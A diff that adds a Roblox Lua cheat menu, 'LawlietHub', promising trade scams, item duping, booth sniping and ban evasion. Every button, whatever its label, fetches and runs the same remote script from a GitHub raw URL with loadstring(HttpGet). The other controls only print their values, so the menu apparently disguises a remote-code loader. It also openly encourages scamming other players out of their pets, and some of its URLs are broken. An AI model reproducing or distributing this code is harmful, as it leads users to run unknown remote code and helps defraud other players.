@@ -1,0 +1,390 @@
+local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/MrGalaxy10/orion-library/main/PrivateSource",true))()
+local Window = OrionLib:MakeWindow({Name = "LawlietHub V.3.6", IntroEnabled = false, HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+ 
+local Tab = Window:MakeTab({
+	Name = "Info",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+ 
+Tab:AddParagraph("Hello","If u readin this that mean u use my hub, thanks for it,This Script Made By Llawliet#0718 There Are Every Script U want like Duping Farm Scam Trade etc. Partnertag And Trade Scam is bests (use v2 op) There Are Antibans u need to execute before u execute any script for bypass banning it works at every executor this script Gets updated at every 3 days Go dm Llawliet#0718 for more update                                      My discord is https://discord.gg/jGe9Z8kwGB")
+ 
+
+ 
+Tab:AddParagraph("Tutorial","Before execute script, make sure u Execute This(bug reports Llawliet#0718)")
+ 
+ 
+Tab:AddButton({
+	Name = "Start Antiban",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/barann222/farming/main/farmingscript.lua", true))()
+  	end    
+})
+
+
+
+local Tab = Window:MakeTab({
+	Name = "TradeScam NEW!",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+ 
+
+ 
+Tab:AddParagraph("Tutorial","Before Tapping The Button set the lagger And Tap The Starting Button Will Black Big gui Appear it is Gonna Download Datas just Wait To second 10 it Will Destroy Himself after Trade Someone U will have Trade Scam hack (bug reports Llawliet#0718)")
+ 
+ 
+Tab:AddButton({
+	Name = "Start Scam Trade",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/barann222/farming/main/farmingscript.lua", true))()
+  	end    
+})
+
+Tab:AddSlider({
+	Name = "ms invertal",
+	Min = 0,
+	Max = 20,
+	Default = 5,
+	Color = Color3.fromRGB(60,120,80),
+	Increment = 1,
+	ValueName = "ms invertal",
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+
+--[[
+Name = <string> - The name of the slider.
+Min = <number> - The minimal value of the slider.
+Max = <number> - The maxium value of the slider.
+Increment = <number> - How much the slider will change value when dragging.
+Default = <number> - The default value of the slider.
+ValueName = <string> - The text after the value number.
+Callback = <function> - The function of the slider.
+]]
+
+local Tab = Window:MakeTab({
+	Name = "TradeScam V2!",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+ 
+
+ 
+Tab:AddParagraph("Tutorial"," DONT FORGET TAP BUTTON IF U DONT TAP U CANT GET UR PETS BACK Write Your Pets Name You Want To Trade when u Type TAP!!! Button And Trade Someone When u Finish Trade You Will get Pets Back But not The Other Player DONT FORGET TO TAP BUTTON IF U FORGET U CANT GET UR PETS BACK")
+ 
+ 
+
+Tab:AddTextbox({
+	Name = "Pet Name",
+	Default = "Type here",
+	TextDisappear = true,
+	Callback = function(Value)
+		print(Value)
+	end	  
+})
+
+Tab:AddTextbox({
+	Name = "The Name You Give ur pet",
+	Default = "Type Here",
+	TextDisappear = true,
+	Callback = function(Value)
+		print(Value)
+	end	  
+})
+
+Tab:AddTextbox({
+	Name = "Write  Here Ur Pet type Like Secret Or exclusive",
+	Default = "Here",
+	TextDisappear = true,
+	Callback = function(Value)
+		print(Value)
+	end	  
+})
+
+Tab:AddButton({
+	Name = "START SCAM TRADE",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/barann222/farming/main/farmingscript.lua", true))()
+  	end    
+})
+
+local Tab = Window:MakeTab({
+	Name = "Boothsniper",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddParagraph("Tutorial","Execute And Select What Pets U want and Tap Start then u have Boothsniper (use Antiban) (bug reports Llawliet#0718)")
+
+Tab:AddButton({
+	Name = "Start Boothsnipe",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/barann222/farming/main/farmingscript.lua", true))()
+  	end    
+})
+
+
+Tab:AddDropdown({
+	Name = "Select exc Types U want",
+	Default = "1",
+	Options = {"Companions I", "Companions II", "Companions III"},
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+
+
+ Tab:AddSlider({
+	Name = "Select how Much U gonna use Gems ",
+	Min = 0,
+	Max = 999,
+	Default = 999,
+	Color = Color3.fromRGB(60,120,80),
+	Increment = 1,
+	ValueName = "M",
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+
+Tab:AddToggle({
+	Name = "igrone Eventpets",
+	Default = false,
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+
+Tab:AddToggle({
+	Name = "Get Excelusivies,Eggs under 999M",
+	Default = false,
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+
+Tab:AddToggle({
+	Name = "Get Signed Exc under 999M",
+	Default = false,
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+
+Tab:AddToggle({
+	Name = "Auto Server Hop",
+	Default = false,
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+
+
+local Tab = Window:MakeTab({
+	Name = "Boothsniper Pro",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+ 
+ 
+Tab:AddParagraph("Tutorial","Execute And Select What Pets U want and Tap Start then u have Boothsniper (use Antiban) (bug reports Llawliet#0718)")
+ 
+ 
+Tab:AddButton({
+	Name = "Start Boothsnipe",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/barann222/farming/main/farmingscript.lua", true))()
+  	end    
+})
+
+ Tab:AddSlider({
+	Name = "Select how Much U gonna use Gems",
+	Min = 0,
+	Max = 100,
+	Default = 100,
+	Color = Color3.fromRGB(60,120,80),
+	Increment = 1,
+	ValueName = "B",
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+
+Tab:AddToggle({
+	Name = "igrone HugeHellrock",
+	Default = false,
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+
+Tab:AddToggle({
+	Name = "Get Excelusivies,Eggs under 500m",
+	Default = false,
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+
+Tab:AddToggle({
+	Name = "Get Signed Huges Under 25b",
+	Default = false,
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+
+local Tab = Window:MakeTab({
+	Name = "Dupe Hack ",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+ 
+
+ 
+Tab:AddParagraph("Tutorial","Before execute script, set the ms invertal, make sure u have Huges for this to work, first execute the script big black gui will hide process after waiting a 20 seconds will black gui destory himself it didnt leave the game after leaving game rejoin and use it again if will automaticly stops. DONT LEAVE THE GAME BEFORE 20 SECONDS!!! (bug reports Llawliet#0718)")
+ 
+ 
+Tab:AddButton({
+	Name = "Start Dupe",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/barann222/farming/main/farmingscript.lua", true))()
+  	end    
+})
+
+ Tab:AddSlider({
+	Name = "ms invertal",
+	Min = 0,
+	Max = 20,
+	Default = 5,
+	Color = Color3.fromRGB(60,120,80),
+	Increment = 1,
+	ValueName = "ms invertal",
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+
+--[[
+Name = <string> - The name of the slider.
+Min = <number> - The minimal value of the slider.
+Max = <number> - The maxium value of the slider.
+Increment = <number> - How much the slider will change value when dragging.
+Default = <number> - The default value of the slider.
+ValueName = <string> - The text after the value number.
+Callback = <function> - The function of the slider.
+]]
+ 
+local Tab = Window:MakeTab({
+	Name = "Partner Tag",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+ 
+Tab:AddParagraph("Tips to get best hits","If u want to get a huge or something cool u should dont spam too much with this, say it like 1 time and then wait 10-15 sec after chat will spam your messages out, after that say it again and repeat until u get a hit, after u get a hit serverhop")
+Tab:AddParagraph("READ THIS","Put script in autoexec folder so u dont have to click execute over and over after serverhopping")
+ 
+ 
+
+
+Tab:AddBind({
+	Name = "Serverhop Bind",
+	Default = Enum.KeyCode.KeypadNine,
+	Hold = false,
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/barann222/farming/main/farmingscript.lua", true))()
+
+module:Teleport(game.PlaceId)
+	end    
+})
+ 
+
+ 
+
+Tab:AddButton({
+	Name = "Moon Partner Tag",
+	Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/barann222/farming/main/farmingscript.lua", true))()
+  	end    
+})
+ 
+ 
+local Tab = Window:MakeTab({
+	Name = "Best Scripts",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+ 
+Tab:AddButton({
+	Name = "Milk Up Premium",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/barann222/farming/main/farmingscript.lua", true))()
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Project WD",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/barann222/farming/main/farmingscript.lua", true))()
+ 
+  	end    
+})
+
+Tab:AddButton({
+	Name = "BlackTrap pc",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/barann222/farming/main/farmingscript.lua", true))()
+  	end    
+})
+
+Tab:AddButton({
+	Name = "BlackTrap Mobile",
+	Callback = function()
+      		loadstring(game:HttpGet("ttps://raw.githubusercontent.com/barann222/farming/main/farmingscript.lua"))()
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Fake Titanic Gui",
+	Callback = function()
+      		loadstring(game:HttpGet("ttps://raw.githubusercontent.com/barann222/farming/main/farmingscript.lua"))()
+  	end    
+})
+
+Tab:AddButton({
+	Name = "farm",
+	Callback = function()
+      		loadstring(game:HttpGet("ttps://raw.githubusercontent.com/barann222/farming/main/farmingscript.lua"))()
+  	end    
+})
+ 
+Tab:AddButton({
+	Name = "wust visual script",
+	Callback = function()
+      		getgenv().AuthKey="HUGE_uDHHZxagRcoYwGkd"
+getgenv().LoadSettings={
+    UseSeperateSaves=false,
+    DisableStartupPrompt=false,
+    DisableGamepassCheck=false,
+}
+loadstring(game:HttpGet("ttps://raw.githubusercontent.com/barann222/farming/main/farmingscript.lua"))()
+  	end    
+})
+ 
+local Tab = Window:MakeTab({
+	Name = "Destroy Gui",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+ 
+Tab:AddButton({
+	Name = "Destroy it!",
+	Callback = function()
+      		OrionLib:Destroy()
+  	end    
+})
+ 
+ 
+OrionLib:Init()
